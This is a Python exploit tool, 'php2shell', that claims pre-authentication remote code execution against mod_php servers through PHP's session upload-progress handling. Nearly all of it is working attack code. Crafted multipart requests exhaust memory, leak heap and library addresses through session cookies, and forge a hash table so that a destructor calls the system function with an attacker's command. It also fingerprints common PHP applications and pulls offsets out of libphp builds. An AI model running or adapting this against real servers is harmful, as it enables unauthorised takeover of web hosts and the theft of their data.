#!/usr/bin/env python3
"""
PHP2SHELL - pre-auth RCE in PHP core session.upload_progress handling.
CVE-2026-109618 / CVE-2026-109619.

exploit by clevergod

Chain (attacker traffic is plain HTTP):
  0. rotate   OOM request + session init -> prefork child aborts, master forks a
              fresh worker with an identical address-space layout;
  1. leak     Set-Cookie: PHPSESSID carries heap pointers -> Zend MM chunk base;
  2. leak     Set-Cookie carries a zval_ptr_dtor pointer -> libphp base;
  3. fire     upload_progress fake reference overwrites PS(http_session_vars)
              and a fake HashTable with pDestructor = zif_system executes the
              command while the session is destroyed.

Engine is a reimplementation of the public remote chain (xuehuolll,
technique credit 9bie); output layer, target discovery, symbol extraction and
per-build heap calibration are this tool's own.

Usage:
  python3 php2shell.py rce http://127.0.0.1:8088/ --cmd 'id'
  python3 php2shell.py rce http://host/ --libphp ./libphp.so --cmd 'id'
  python3 php2shell.py rce http://host/ --docker-container php2shell-target
  python3 php2shell.py calibrate http://host/ --libphp ./libphp.so \
      --range 0x68d000:0x696000:0x8

Target requirements: mod_php + prefork with a single worker, display_errors=On,
memory_limit below the POST body, post_max_size above it, upload_progress On.
"""
from __future__ import annotations

import argparse
import json
import os
import re
import socket
import struct
import subprocess
import sys
import time
import urllib.error
import urllib.request
from collections import Counter
from urllib.parse import unquote_to_bytes, urlparse

VERSION = "1.0"
AUTHOR = "clevergod"
SID = b"attacksessionid0001"
MAX_CMD = 14
LO_PTR = 0x550000000000
HI_PTR = 0x800000000000
PROFILE_DIR = os.path.expanduser("~/.php2shell")
PROFILE_FILE = os.path.join(PROFILE_DIR, "profiles.json")

# Zend MM chunk-relative heap geometry measured on php:8.4.26-apache (Debian 12)
BOOKWORM = dict(htdata=0x690D8, stage1_n=841, stage2_t=406, stage2_v=16,
                pads=[[31, 31]] * 6, carrier=True)
# intel: measured on php:8.5.11-apache by this tool (see profiles.json)
BUILTIN = {
    "bookworm": dict(name="php8.4.26-apache", **BOOKWORM),
}
# zif_system / zval_ptr_dtor, measured from libphp.so of the official apache images
BUILTIN_OFFSETS = {
    "8.2.34": (0x39B8A0, 0x487650),
    "8.3.35": (0x3AC080, 0x49EC50),
    "8.4.26": (0x465370, 0x65EB60),
    "8.5.11": (0x5996E0, 0x7B47A0),
}


# ---------------------------------------------------------------- output layer
class UI:
    """WIZ-style terminal output: timestamps, stage numbers, status columns."""

    BLUE = "\033[38;5;33m"
    CYAN = "\033[38;5;51m"
    GREEN = "\033[38;5;41m"
    RED = "\033[38;5;203m"
    YELLOW = "\033[38;5;221m"
    GRAY = "\033[38;5;245m"
    DIM = "\033[38;5;240m"
    WHITE = "\033[97m"
    BOLD = "\033[1m"
    OFF = "\033[0m"

    BANNER_FONT = {
        "P": [" ____  ", "|  _ \\ ", "| |_) |", "|  __/ ", "|_|    "],
        "H": [" _   _ ", "| | | |", "| |_| |", "|  _  |", "|_| |_|"],
        "2": [" ____  ", "|___ \\ ", "  __) |", " / __/ ", "|_____|"],
        "S": [" ____  ", "/ ___| ", "\\___ \\ ", " ___) |", "|____/ "],
        "E": [" _____ ", "| ____|", "|  _|  ", "| |___ ", "|_____|"],
        "L": [" _     ", "| |    ", "| |    ", "| |___ ", "|_____|"],
    }
    GRADIENT = ("\033[38;5;27m", "\033[38;5;33m", "\033[38;5;39m",
                "\033[38;5;45m", "\033[38;5;51m")

    @classmethod
    def render_banner(cls, text="PHP2SHELL"):
        rows = [""] * 5
        for ch in text:
            glyph = cls.BANNER_FONT[ch]
            for i in range(5):
                rows[i] += glyph[i]
        return rows

    def __init__(self, color=True):
        self.on = color and sys.stdout.isatty() and os.environ.get("NO_COLOR") is None
        self.t0 = time.monotonic()
        self.stage_no = 0
        self.w = 11

    # color helper
    def c(self, s, code):
        return f"{code}{s}{self.OFF}" if self.on else str(s)

    def ts(self):
        d = time.monotonic() - self.t0
        return f"{int(d // 60):02d}:{d % 60:05.2f}"

    # -- blocks
    def banner(self):
        for i, line in enumerate(self.render_banner("PHP2SHELL")):
            shade = self.GRADIENT[min(i, len(self.GRADIENT) - 1)]
            print(self.c(line, shade + self.BOLD) if self.on else line)
        sub = f"exploit by {AUTHOR} · v{VERSION} / automatic target discovery and command execution"
        print()
        print(self.c(" " + sub, self.GRAY))
        print()
        print(self.c("─" * 78, self.DIM))

    def chain(self, remote, cmd=None, subtitle=None):
        print(self.c("CHAIN 01/01", self.BLUE + self.BOLD))
        print(self.c("  " + (subtitle or "Automatic target detection / fingerprint and fixed command proof"), self.GRAY))
        print(self.c(f"  remote={remote}", self.GRAY))
        if cmd:
            print(self.c(f"  command={cmd!r}", self.GRAY))
        print()

    def stage(self, name, desc):
        self.stage_no += 1
        n = f"{self.stage_no:02d}"
        print(f"{self.c(self.ts(), self.GREEN)}  {self.c(n, self.BLUE + self.BOLD)}  "
              f"{self.c(name, self.WHITE + self.BOLD)}  {self.c(desc, self.WHITE)}")

    def step(self, tag, label, value="", code=None):
        """tag: OK / INFO / WARN / FAIL / STEP"""
        colors = {"OK": self.GREEN, "INFO": self.CYAN, "WARN": self.YELLOW,
                  "FAIL": self.RED, "STEP": self.CYAN, "HIT": self.GREEN}
        tcol = colors.get(tag, self.CYAN)
        ts = self.ts() if tag != "STEP" else " " * 8
        line = f"{self.c(ts, self.GREEN)}  {self.c(tag.ljust(4), tcol)}  {self.c(label.upper(), self.WHITE)}"
        if value:
            line += f"  {self.c(value, self.GRAY)}"
        print(line)

    def kv(self, key, value):
        print(f"{' ' * 8}  {self.c(key.ljust(18), self.GRAY)}  {self.c(value, self.WHITE)}")

    def info(self, label, value):
        print(f"{self.c(self.ts(), self.GREEN)}  {self.c('INFO', self.CYAN)}  "
              f"{self.c(label.upper(), self.WHITE)}  {self.c(value, self.GRAY)}")

    def ok(self, label, value):
        print(f"{self.c(self.ts(), self.GREEN)}  {self.c('OK', self.GREEN)}  "
              f"{self.c(label.upper(), self.WHITE)}  {self.c(value, self.WHITE + self.BOLD)}")

    def fail(self, label, value):
        print(f"{self.c(self.ts(), self.GREEN)}  {self.c('FAIL', self.RED)}  "
              f"{self.c(label.upper(), self.WHITE)}  {self.c(value, self.RED)}")

    def warn(self, label, value):
        print(f"{self.c(self.ts(), self.GREEN)}  {self.c('WARN', self.YELLOW)}  "
              f"{self.c(label.upper(), self.WHITE)}  {self.c(value, self.YELLOW)}")

    def output(self, text):
        stars = "·*:.✧.:*·" * 8
        print()
        print(self.c(stars, self.BLUE + self.DIM))
        print(f"{self.c(self.ts(), self.GREEN)}  {self.c('OK', self.GREEN)}  "
              f"{self.c('OUTPUT', self.WHITE)}  {self.c(text.strip(), self.WHITE + self.BOLD)}")
        print(self.c(stars[::-1], self.BLUE + self.DIM))
        print()

    def progress(self, label, seconds):
        width = 34
        if not self.on:
            print(f"{self.ts()}  {label}  {seconds:.1f}s")
            return
        full = "█" * width
        print(f"{self.c(self.ts(), self.GREEN)}  {self.c(full, self.BLUE)}  "
              f"{self.c(f'100% {label}', self.WHITE)}  {self.c(f'{seconds:.1f}s', self.WHITE)}")

    def die(self, msg):
        print()
        print(f"{self.c(self.ts(), self.GREEN)}  {self.c('FAIL', self.RED)}  {self.c(msg, self.RED)}")
        sys.exit(1)


# ------------------------------------------------------------------- transport
def multipart(parts, boundary):
    out = bytearray()
    for p in parts:
        out += b"--" + boundary + b"\r\n"
        out += b'Content-Disposition: form-data; name="' + p["name"].encode() + b'"'
        if p.get("filename") is not None:
            out += b'; filename="' + p["filename"].encode() + b'"'
            out += b"\r\nContent-Type: application/octet-stream"
        out += b"\r\n\r\n" + p["data"] + b"\r\n"
    out += b"--" + boundary + b"--\r\n"
    return bytes(out)


class Target:
    def __init__(self, url, timeout=60.0):
        u = urlparse(url)
        self.url = url
        self.host, self.port = u.hostname, u.port or 80
        self.path = u.path or "/"
        if u.query:
            self.path += "?" + u.query
        self.timeout = timeout
        self.sent = 0
        self.recv = 0

    def post(self, body, boundary, read_cap=1 << 20, timeout=None,
             extra_headers=None, cookie=None):
        head = (f"POST {self.path} HTTP/1.1\r\nHost: {self.host}\r\n"
                f"Content-Type: multipart/form-data; boundary={boundary.decode()}\r\n"
                f"Content-Length: {len(body)}\r\nConnection: close\r\n").encode()
        if cookie:
            head += f"Cookie: {cookie}\r\n".encode()
        for k, v in (extra_headers or {}).items():
            head += f"{k}: {v}\r\n".encode()
        head += b"\r\n"
        s = socket.create_connection((self.host, self.port), timeout=timeout or self.timeout)
        s.settimeout(timeout or self.timeout)
        try:
            s.sendall(head + body)
            self.sent += len(head) + len(body)
        except OSError:
            return b""
        data = bytearray()
        try:
            while len(data) < read_cap:
                chunk = s.recv(min(65536, read_cap - len(data)))
                if not chunk:
                    break
                data += chunk
        except (socket.timeout, OSError):
            pass
        finally:
            s.close()
        self.recv += len(data)
        return bytes(data)

    def post_chunked(self, body, boundary, read_cap=1 << 20, timeout=None):
        """Chunked upload: PHP compares post_max_size against Content-Length, so
        a lengthless body is parsed anyway. This is how the public research gets
        past a small post_max_size."""
        head = (f"POST {self.path} HTTP/1.1\r\nHost: {self.host}\r\n"
                f"Content-Type: multipart/form-data; boundary={boundary.decode()}\r\n"
                f"Transfer-Encoding: chunked\r\nConnection: close\r\n\r\n").encode()
        s = socket.create_connection((self.host, self.port), timeout=timeout or self.timeout)
        s.settimeout(timeout or self.timeout)
        try:
            s.sendall(head)
            for i in range(0, len(body), 65536):
                piece = body[i:i + 65536]
                s.sendall(f"{len(piece):x}\r\n".encode() + piece + b"\r\n")
            s.sendall(b"0\r\n\r\n")
            self.sent += len(head) + len(body)
        except OSError:
            return b""
        data = bytearray()
        try:
            while len(data) < read_cap:
                chunk = s.recv(min(65536, read_cap - len(data)))
                if not chunk:
                    break
                data += chunk
        except (socket.timeout, OSError):
            pass
        finally:
            s.close()
        self.recv += len(data)
        return bytes(data)

    def head(self, path="/", timeout=8.0):
        req = urllib.request.Request(f"http://{self.host}:{self.port}{path}",
                                     headers={"User-Agent": "php2shell/1.0"})
        try:
            r = urllib.request.urlopen(req, timeout=timeout)
            return r.status, dict(r.headers), r.read(4096)
        except urllib.error.HTTPError as e:
            return e.code, dict(e.headers), b""
        except Exception as e:
            return 0, {}, str(e).encode()


# -------------------------------------------------------------------- parsing
def elf_gadgets(path):
    """Derive a build-stable terminal from any libphp.so, stripped or not.

    Returns a dict with zif_system (if exported), popen_plt, exit_plt and a
    leave;ret gadget address. popen@plt / exit@plt come from .rela.plt +
    .plt.sec (present in stripped distro builds); leave;ret is a byte scan of
    the RX segments. This is the terminal the public PoCs use, so it does not
    depend on zif_system surviving in the symbol table.
    """
    data = open(path, "rb").read()
    if data[:4] != b"\x7fELF" or data[4] != 2 or data[5] != 1:
        raise ValueError("not an ELF64 little-endian file")

    def u(off, fmt):
        return struct.unpack_from(fmt, data, off)[0]

    e_shoff = u(0x28, "<Q"); e_shentsize = u(0x3A, "<H"); e_shnum = u(0x3C, "<H")
    e_shstrndx = u(0x3E, "<H")
    e_phoff = u(0x20, "<Q"); e_phentsize = u(0x36, "<H"); e_phnum = u(0x38, "<H")

    secs = []
    for i in range(e_shnum):
        off = e_shoff + i * e_shentsize
        secs.append({
            "name_off": u(off, "<I"), "type": u(off + 4, "<I"),
            "addr": u(off + 16, "<Q"), "off": u(off + 24, "<Q"),
            "size": u(off + 32, "<Q"), "link": u(off + 40, "<I"),
            "entsize": u(off + 56, "<Q"),
        })
    shstr = secs[e_shstrndx]
    strtab = data[shstr["off"]:shstr["off"] + shstr["size"]]

    def sname(s):
        e = strtab.find(b"\0", s["name_off"])
        return strtab[s["name_off"]:e].decode("latin1")

    names = {i: sname(s) for i, s in enumerate(secs)}
    by_name = {sname(s): s for s in secs}

    out = {}

    def section_bytes(s):
        return data[s["off"]:s["off"] + s["size"]]

    # 1) exported zif_system (only on non-stripped builds)
    try:
        out["zif_system"] = elf_symbols(path, {"zif_system"}).get("zif_system")
    except Exception:
        out["zif_system"] = None

    # 2) popen@plt / exit@plt from .rela.plt + .plt.sec/.plt
    for target in ("popen", "exit"):
        val = None
        rela = by_name.get(".rela.plt")
        dynsym = by_name.get(".dynsym")
        dynstr = by_name.get(".dynstr")
        pltsec = by_name.get(".plt.sec")
        plt = by_name.get(".plt")
        if rela and dynsym and dynstr and (pltsec or plt):
            strs = section_bytes(dynstr)
            got2name = {}
            for j in range(rela["size"] // 24):
                r_off = u(rela["off"] + j * 24, "<Q")
                r_info = u(rela["off"] + j * 24 + 8, "<Q")
                symidx = r_info >> 32
                if r_info & 0xFFFFFFFF != 7:  # JUMP_SLOT only
                    continue
                st_name = u(dynsym["off"] + symidx * dynsym["entsize"], "<I")
                e = strs.find(b"\0", st_name)
                nm = strs[st_name:e].decode("latin1")
                got2name[r_off] = nm
            for sec in (pltsec, plt):
                if not sec:
                    continue
                # .plt.sec has no resolver stub, .plt has a 16-byte PLT0 first
                start = 1 if sec is plt else 0
                for i in range(start, (sec["size"] // 16) + 1):
                    sa = sec["addr"] + 16 * i
                    so = sec["off"] + 16 * i
                    chunk = data[so:so + 16]
                    pos = chunk.find(b"\xff\x25")  # jmp qword [rip+disp]
                    if pos == -1 or pos + 6 > len(chunk):
                        continue
                    disp = struct.unpack_from("<i", chunk, pos + 2)[0]
                    got = sa + pos + 6 + disp
                    if got2name.get(got, "") == target:
                        val = sa
                        break
                if val:
                    break
        out[f"{target}_plt"] = val

    # 3) leave;ret gadget scan over executable segments
    out["leave_ret"] = None
    for i in range(e_phnum):
        ph = e_phoff + i * e_phentsize
        p_type = u(ph, "<I")
        p_flags = u(ph + 4, "<I")
        p_vaddr = u(ph + 16, "<Q")
        p_off = u(ph + 8, "<Q")
        p_filesz = u(ph + 32, "<Q")
        if p_type != 1 or not (p_flags & 0x1):  # PT_LOAD, executable
            continue
        seg = data[p_off:p_off + p_filesz]
        idx = seg.find(b"\xc9\xc3")
        if idx != -1:
            out["leave_ret"] = p_vaddr + idx
            break
    return out


def elf_symbols(path, wanted):

    data = open(path, "rb").read()
    if data[:4] != b"\x7fELF" or data[4] != 2 or data[5] != 1:
        raise ValueError("not an ELF64 little-endian file")
    e_shoff = struct.unpack_from("<Q", data, 0x28)[0]
    e_shentsize = struct.unpack_from("<H", data, 0x3A)[0]
    e_shnum = struct.unpack_from("<H", data, 0x3C)[0]
    e_shstrndx = struct.unpack_from("<H", data, 0x3E)[0]
    secs = []
    for i in range(e_shnum):
        off = e_shoff + i * e_shentsize
        name_off, sh_type = struct.unpack_from("<II", data, off)
        sh_addr, sh_offset, sh_size = struct.unpack_from("<QQQ", data, off + 0x10)
        sh_link = struct.unpack_from("<I", data, off + 0x28)[0]
        sh_entsize = struct.unpack_from("<Q", data, off + 0x38)[0]
        secs.append((name_off, sh_type, sh_addr, sh_offset, sh_size, sh_link, sh_entsize))
    shstr = secs[e_shstrndx]
    strtab = data[shstr[3]:shstr[3] + shstr[4]]
    out = {}
    for _no, sh_type, _addr, sh_offset, sh_size, sh_link, sh_entsize in secs:
        if sh_type not in (2, 11) or not sh_entsize:
            continue
        str_sec = secs[sh_link]
        strs = data[str_sec[3]:str_sec[3] + str_sec[4]]
        for j in range(sh_size // sh_entsize):
            off = sh_offset + j * sh_entsize
            st_name = struct.unpack_from("<I", data, off)[0]
            st_shndx = struct.unpack_from("<H", data, off + 6)[0]
            st_value = struct.unpack_from("<Q", data, off + 8)[0]
            if st_shndx == 0:
                continue
            end = strs.find(b"\0", st_name)
            nm = strs[st_name:end].decode("latin1")
            if nm in wanted:
                out[nm] = st_value
    return out


def cookie_bytes(resp):
    m = re.search(rb"Set-Cookie: PHPSESSID=([^\r\n]*?); path=/", resp)
    if not m:
        return b""
    return unquote_to_bytes(m.group(1).decode("latin1"))


def chunk_base(raw):
    if len(raw) < 1000:
        return 0
    c = Counter()
    for i in range(len(raw) - 8):
        v = int.from_bytes(raw[i:i + 8], "little")
        if LO_PTR <= v < HI_PTR:
            c[v & ~0x1FFFFF] += 1
    if not c:
        return 0
    base, n = c.most_common(1)[0]
    return base if n >= 8 else 0


def libphp_base(raw, dtor, zif=None):
    if len(raw) < 16:
        return 0
    cands = [int.from_bytes(raw[8:16], "little")]
    cands += [int.from_bytes(raw[i:i + 8], "little") for i in range(0, max(0, len(raw) - 8), 8)]
    for p in cands:
        if not (LO_PTR <= p < HI_PTR):
            continue
        if p & 0xFFF != dtor & 0xFFF:
            continue
        base = p - dtor
        if base & 0xFFF == 0:
            return base
    return 0


# --------------------------------------------------------------------- engine
class Exploit:
    def __init__(self, ui, target, cmd, off, profile):
        self.ui, self.t, self.cmd = ui, target, cmd.encode()
        if len(self.cmd) > MAX_CMD:
            ui.die(f"command too long: {len(self.cmd)} > {MAX_CMD} bytes")
        self.zif, self.dtor, self.htdata = off["zif"], off["dtor"], profile["htdata"]
        self.stage1_n = profile["stage1_n"]
        self.stage2_t = profile["stage2_t"]
        self.stage2_v = profile["stage2_v"]
        self.pads = profile["pads"]
        self.carrier = profile["carrier"]
        self.amp = profile.get("amp")

    # request builders -----------------------------------------------------
    def big(self):
        return {"name": "big", "data": b"B" * (12 * 1024 * 1024)}

    def big_parts(self):
        """Memory-pressure payload. amp=True uses empty-filename upload parts
        with deeply nested keys: ~250 bytes of wire each expand into six
        $_FILES hierarchies, so a small body exhausts a large memory_limit
        without touching post_max_size (public research technique)."""
        if not self.amp:
            return [self.big()]
        name = "a[]" + "[a]" * 62
        return [{"name": name, "filename": "", "data": b""} for _ in range(self.amp)]

    def file_part(self):
        return {"name": "f", "filename": "a.txt", "data": b"A" * 64}

    def rotate(self):
        parts = [{"name": f"f{i:04d}"[:5], "data": b"V" * 3000} for i in range(1001)]
        parts += [{"name": "PHPSESSID", "data": b"\x00"},
                  {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
                  self.file_part(), *self.big_parts()]
        self.t.post(multipart(parts, b"S" * 17), b"S" * 17, read_cap=1 << 20, timeout=90.0)
        time.sleep(0.3)
        parts = [{"name": "PHPSESSID", "data": SID},
                 {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"}]
        self.t.post(multipart(parts, b"BNDRY12345"), b"BNDRY12345", read_cap=65536, timeout=20.0)
        time.sleep(0.5)

    def stage1(self):
        parts = [{"name": f"p{i:04d}", "data": b"x"} for i in range(1001)]
        parts += [{"name": "PHPSESSID", "data": b"\x00"},
                  {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
                  self.file_part(), *self.big_parts()]
        self.t.post(multipart(parts, b"S" * 17), b"S" * 17, read_cap=1 << 20, timeout=90.0)
        time.sleep(0.2)
        parts = [{"name": "PHPSESSID", "data": SID},
                 {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"}]
        for i in range(self.stage1_n):
            parts.append({"name": str(1000 + i), "data": (f"v{i:04d}" + "x" * 44)[:48].encode()})
        forge = bytearray(b"A" * 79)
        struct.pack_into("<Q", forge, 0x10, 0x1000)
        forge[0x18] = ord("L")
        parts.append({"name": "1999", "data": bytes(forge)})
        resp = self.t.post(multipart(parts, b"B" * 10), b"B" * 10, read_cap=9 << 20)
        return chunk_base(cookie_bytes(resp))

    def stage2(self):
        parts = [{"name": f"f{i:04d}"[:5], "data": b"x" * 39} for i in range(1001)]
        parts += [{"name": "PHPSESSID", "data": b"\x00"},
                  {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
                  self.file_part(), *self.big_parts()]
        self.t.post(multipart(parts, b"S" * 17), b"S" * 17, read_cap=1 << 20, timeout=90.0)
        time.sleep(0.2)
        parts = [{"name": "PHPSESSID", "data": SID},
                 {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"}]
        for i in range(983):
            cnt = 16 if i == self.stage2_t else 1
            for j in range(cnt):
                parts.append({"name": f"a{i:04d}[{j}]", "data": b"x" * self.stage2_v})
        resp = self.t.post(multipart(parts, b"B" * 10), b"B" * 10, read_cap=1 << 20)
        return libphp_base(cookie_bytes(resp), self.dtor)

    def fake(self, htdata, zif):
        cmd = self.cmd
        ht = bytearray(167)
        struct.pack_into("<II", ht, 0x00, 1, 7)
        struct.pack_into("<II", ht, 0x08, 0x10, 0xFFFFFFF8)
        struct.pack_into("<Q", ht, 0x10, htdata + 0x20)
        struct.pack_into("<II", ht, 0x18, 1, 1)
        struct.pack_into("<II", ht, 0x20, 8, 0)
        struct.pack_into("<Q", ht, 0x28, 0)
        struct.pack_into("<Q", ht, 0x30, zif)
        E = 0x20
        struct.pack_into("<Q", ht, E + 0x10, zif)
        struct.pack_into("<I", ht, E + 0x28, 0)
        struct.pack_into("<I", ht, E + 0x2C, 1)
        struct.pack_into("<Q", ht, E + 0x50, htdata + 0x80)
        struct.pack_into("<I", ht, E + 0x58, 6)
        struct.pack_into("<II", ht, 0x80, 1, 0x106)
        struct.pack_into("<Q", ht, 0x90, len(cmd))
        ht[0x98:0x98 + len(cmd)] = cmd
        ht[0x98 + len(cmd)] = 0
        ref = bytearray(b"X" * 55)
        struct.pack_into("<II", ref, 0x10, 1, 10)
        struct.pack_into("<Q", ref, 0x18, htdata)
        struct.pack_into("<Q", ref, 0x20, 0x307)
        struct.pack_into("<Q", ref, 0x28, 0)
        return bytes(ht), bytes(ref)

    def stage3(self, htdata, zif):
        parts = [{"name": "PHPSESSID", "data": b"a" * 19},
                 {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"p" * 3}]
        for i, (nl, vl) in enumerate(self.pads):
            name = (f"p{i:0{nl - 1}d}" if nl > 0 else "")[:nl]
            parts.append({"name": name, "data": b"V" * vl})
        parts += [self.file_part(), *self.big_parts()]
        extra = {"Cookie": "PHPSESSID=" + "a" * 32} if self.carrier else None
        self.t.post(multipart(parts, b"S" * 17), b"S" * 17, read_cap=1 << 20,
                    timeout=90.0, extra_headers=extra)
        time.sleep(0.3)
        ht, ref = self.fake(htdata, zif)
        parts = [{"name": "PHPSESSID", "data": SID},
                 {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"}]
        if self.carrier:
            carrier = struct.pack("<II", 1, 0x1A) + struct.pack("<Q", htdata)[:7]
            for i in range(2):
                parts.append({"name": f"f{i:02d}", "data": b"F" * 15})
            parts.append({"name": "g00", "data": carrier})
            for i in range(15):
                parts.append({"name": f"a{i:030d}"[:31], "data": ht})
        else:
            for i in range(15):
                parts.append({"name": f"a{i:030d}"[:31], "data": ht})
            for i in range(2):
                parts.append({"name": f"f{i:02d}", "data": ref})
        self.t.post(multipart(parts, b"B" * 10), b"B" * 10, read_cap=65536, timeout=30.0)


# ------------------------------------------------------------------- profiles
def load_profiles():
    try:
        with open(PROFILE_FILE) as f:
            return json.load(f)
    except Exception:
        return {}


def save_profiles(p):
    os.makedirs(PROFILE_DIR, exist_ok=True)
    with open(PROFILE_FILE, "w") as f:
        json.dump(p, f, indent=2, sort_keys=True)


def profile_key(phpver, zif, dtor):
    return f"php={phpver or 'unknown'}|zif={zif:#x}|dtor={dtor:#x}"


def libphp_from_container(container, ui):
    ui.info("IMAGE", f"reading libphp.so from container {container}")
    r = subprocess.run(["docker", "exec", container, "sh", "-c",
                        "find /usr/lib/apache2/modules -name 'libphp*.so' 2>/dev/null | head -1"],
                       capture_output=True, text=True)
    cand = r.stdout.strip()
    if not cand:
        for c in ("/usr/lib/apache2/modules/libphp.so",
                  "/usr/lib/apache2/modules/libphp7.so",
                  "/usr/lib/apache2/modules/libphp8.so"):
            rr = subprocess.run(["docker", "exec", container, "test", "-f", c])
            if rr.returncode == 0:
                cand = c
                break
    if cand:
        local = f"/tmp/php2shell-libphp-{container}.so"
        if subprocess.run(["docker", "cp", f"{container}:{cand}", local],
                          capture_output=True).returncode != 0:
            ui.die("docker cp failed")
        ver = subprocess.run(["docker", "exec", container, "php", "-r", "echo PHP_VERSION;"],
                             capture_output=True, text=True).stdout.strip()
        return local, ver
    ui.die("libphp.so not found in container")


# ----------------------------------------------------------------------- main
def app_fingerprint(headers, body, path=""):
    """Detect the web app for the report and to pick an entry point. Cosmetic
    for the exploit itself - the chain hits PHP core, not the app."""
    h = {k.lower(): v for k, v in headers.items()}
    text = body[:8192].decode("latin1", "replace").lower()
    gen = (h.get("x-generator", "") + " " + h.get("x-powered-by", "")).lower()
    p = (path or "").lower()
    marks = [
        ("WordPress", ("wp-content", "wp-includes", "x-pingback", "wordpress", "wp-config"), "/wp-admin/index.php"),
        ("Drupal", ("drupal", "sites/default/files", "x-drupal"), "/core/install.php"),
        ("Joomla", ("joomla", "media/system", "com_content"), "/index.php"),
        ("MediaWiki", ("mediawiki", "/wiki/", "mw-"), "/includes/Setup.php"),
        ("phpBB", ("phpbb", "styles/prosilver"), "/index.php"),
        ("Magento", ("magento", "mage/cookies", "x-magento", "pub/"), "/pub/index.php"),
        ("Laravel", ("laravel_session", "laravel", "x-laravel"), "/index.php"),
        ("Symfony", ("symfony", "_sf_"), "/index.php"),
        ("WHMCS", ("whmcs", "cc_whmcs"), "/index.php"),
    ]
    for name, needles, entry in marks:
        if any(n in gen for n in needles) or any(n in text for n in needles) or name.lower() in p:
            return name, entry
    return "PHP", "/index.php"


def fingerprint(ui, t):
    ui.stage("DISCOVER", "fingerprint remote application")
    status, headers, body = t.head(t.path or "/")
    h = {k.lower(): v for k, v in headers.items()}
    if not status:
        ui.die(f"target unreachable: {headers}")
    server = h.get("server", "unknown")
    powered = h.get("x-powered-by", "")
    phpver = ""
    m = re.search(r"PHP/([0-9][0-9.]*)", powered + " " + server)
    if m:
        phpver = m.group(1)
    cookie = h.get("set-cookie", "")
    app, _entry = app_fingerprint(h, body, t.path)
    ui.ok("DETECTED", f"{app} at {t.host}:{t.port} (HTTP {status})")
    ui.kv("server", server)
    if powered:
        ui.kv("x-powered-by", powered)
    if cookie:
        ui.kv("set-cookie", cookie[:70])
    if phpver:
        ui.ok("PHP", f"version {phpver} (from headers)")
    else:
        ui.warn("PHP", "version not advertised; offsets must come from libphp.so")
    return phpver, server


def preflight(ui, args, phpver, port, server=""):
    ui.stage("PREFLIGHT", "validate target and execution policy")
    zif = dtor = None
    src = ""
    if args.libphp:
        syms = elf_symbols(args.libphp, {"zif_system", "zval_ptr_dtor"})
        if "zif_system" not in syms or "zval_ptr_dtor" not in syms:
            ui.die("zif_system/zval_ptr_dtor not found in " + args.libphp)
        zif, dtor = syms["zif_system"], syms["zval_ptr_dtor"]
        src = os.path.basename(args.libphp)
    if zif is None:
        if not args.docker_container:
            auto = detect_container(port)
            if auto:
                args.docker_container = auto
                ui.info("TARGET", f"local container {auto} publishes port {port}")
        if args.docker_container:
            try:
                local, phpver = libphp_from_container(args.docker_container, ui)
                syms = elf_symbols(local, {"zif_system", "zval_ptr_dtor"})
                zif, dtor = syms["zif_system"], syms["zval_ptr_dtor"]
                src = f"{args.docker_container}:libphp.so"
                ui.kv("php version", phpver)
            except SystemExit:
                raise
            except Exception:
                zif = dtor = None
    if zif is None and phpver in BUILTIN_OFFSETS:
        zif, dtor = BUILTIN_OFFSETS[phpver]
        src = f"built-in table for PHP {phpver}"
    if zif is None:
        ui.die("unknown build: pass --libphp /path/libphp.so or --docker-container NAME")
    ui.info("SIGNATURES", f"zif_system=libphp+{zif:#x} / zval_ptr_dtor=libphp+{dtor:#x}")
    ui.kv("symbol source", src)
    # build-stable terminal (public PoCs' technique, works on stripped distro builds)
    try:
        gpath = args.libphp or (f"/tmp/php2shell-libphp-{args.docker_container}.so" if args.docker_container else "")
        if gpath and os.path.exists(gpath):
            g = elf_gadgets(gpath)
            ui.info("GADGETS", f"popen@plt=+{g['popen_plt'] or 0:#x} exit@plt=+{g['exit_plt'] or 0:#x} "
                               f"leave;ret=+{g['leave_ret'] or 0:#x}")
    except Exception:
        pass
    distro = "debian" if "debian" in server.lower() else ("ubuntu" if "ubuntu" in server.lower() else "unknown")
    ui.info("PROFILE", f"{distro}-php{phpver}" + ("-fpm" if "fpm" in server.lower() else ""))

    off = {"zif": zif, "dtor": dtor}
    prof, pname, psrc = resolve_profile(ui, phpver, zif, dtor, args)
    ui.info("HEAP GEOMETRY", f"{pname} (htdata=chunk+{prof['htdata']:#x}, "
                             f"filler={prof['stage1_n']}, trim={prof['stage2_t']})")
    ui.kv("geometry source", psrc)
    ui.info("WRITE PLAN", "forged HashTable -> pDestructor = zif_system (no ROP, no libc)")
    ui.info("CALL PLAN", f"terminal = libphp+{zif:#x} (zif_system), command <= {MAX_CMD} bytes")
    return off, prof


def resolve_profile(ui, phpver, zif, dtor, args):
    prof = dict(BOOKWORM)
    pname = "bookworm/php8.4.26"
    psrc = "built-in"
    key = profile_key(phpver, zif, dtor)
    cache = load_profiles()
    if args.profile == "bookworm":
        return prof, pname, psrc
    if key in cache and not args.htdata:
        c = cache[key]
        prof.update({k: c[k] for k in ("htdata", "stage1_n", "stage2_t", "stage2_v", "pads", "carrier") if k in c})
        return prof, c.get("name", pname), "cache " + PROFILE_FILE
    if args.htdata:
        prof["htdata"] = args.htdata
        return prof, f"manual htdata", "command line"
    if args.profile == "auto" and key not in cache and phpver not in ("", "8.4.26"):
        ui.warn("PROFILE", "no calibrated heap geometry for this build")
        ui.kv("calibrate with", "--calibrate --range 0x69000:0x69400:0x8")
        ui.kv("cache key", key)
    return prof, pname, psrc


def cmd_artifact(cmd):
    """Path the command writes to, e.g. 'id>/out/p' -> '/out/p'."""
    m = re.search(r">\s*([^\s;&|]+)", cmd)
    return m.group(1) if m else ""


def detect_container(port):
    """Find a docker container publishing the target port (local labs)."""
    try:
        out = subprocess.run(["docker", "ps", "--format", "{{.Names}}|{{.Ports}}"],
                             capture_output=True, text=True, timeout=10).stdout
    except Exception:
        return ""
    for line in out.splitlines():
        name, _, ports = line.partition("|")
        if f":{port}->" in ports:
            return name
    return ""


def prove(args, cmd="id"):
    """Read the proof file: from the target container when known, else from disk."""
